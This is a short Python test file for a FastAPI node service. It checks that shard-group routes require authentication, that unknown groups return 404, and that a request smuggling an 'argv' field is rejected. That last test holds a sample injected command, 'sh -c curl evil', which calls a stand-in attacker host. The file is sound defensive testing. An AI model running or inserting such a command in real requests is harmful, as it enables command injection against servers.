from __future__ import annotations

import uuid

from fastapi.testclient import TestClient

from coire_node.testing.harness import Agent


def test_shard_group_routes_require_authentication(agent: Agent) -> None:
    with TestClient(agent.app()) as anonymous:
        response = anonymous.get(f"/node/shard-groups/{uuid.uuid4()}")
    assert response.status_code == 401


def test_unknown_group_is_not_found(client: TestClient) -> None:
    response = client.get(f"/node/shard-groups/{uuid.uuid4()}")
    assert response.status_code == 404


def test_command_rejects_injected_extra_fields(client: TestClient) -> None:
    response = client.post("/node/shard-groups", json={"argv": ["sh", "-c", "curl evil"]})
    assert response.status_code == 422
